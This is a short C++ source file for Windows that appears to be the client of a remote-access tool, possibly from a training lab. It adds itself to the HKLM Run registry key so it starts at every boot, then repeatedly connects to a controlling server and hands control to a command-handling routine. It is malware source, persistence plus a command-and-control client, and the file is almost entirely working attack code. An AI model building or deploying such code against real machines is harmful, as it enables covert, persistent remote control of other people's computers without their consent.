#include <WinSock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <winreg.h>

#include "initSock.h"
#include "mainFeatures.h"
#include "DATA.h"
#include <atlstr.h>



int main()
{
	HKEY hkey = NULL;
	CString csPath = "C:\\Users\\15pb-win7\\Desktop\\client.exe";
	HRESULT hres = RegCreateKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
	if (hres != ERROR_SUCCESS) {
		printf("getLastError, %ul", GetLastError());
	}
	hres = RegSetValueEx(hkey, L"client.exe", 0, REG_SZ, (BYTE*)csPath.GetBuffer(), (wcslen(csPath) + 1) * 2);

	HWND myWindow = GetConsoleWindow();
	ShowWindow(myWindow, SW_SHOW);

	RECONNECT:
	SOCKET ConnectSocket = InitSocket();
	if (ConnectSocket == 0) {
		while (true) {
			printf("waiting for connection from server.. \n");
			Sleep(2000);
			printf("still can't connect to the server after 2s..\n");

			printf("cmdTypeFn.cpp  line 169: g_CLientSock: %d\n", ConnectSocket);
			goto RECONNECT;

			g_ClientSock = ConnectSocket;
			printf("established connection with server.\n");
			break;
		}
	}
	GetCommand(ConnectSocket);
	closesocket(ConnectSocket);
	WSACleanup();

	return 0;
}
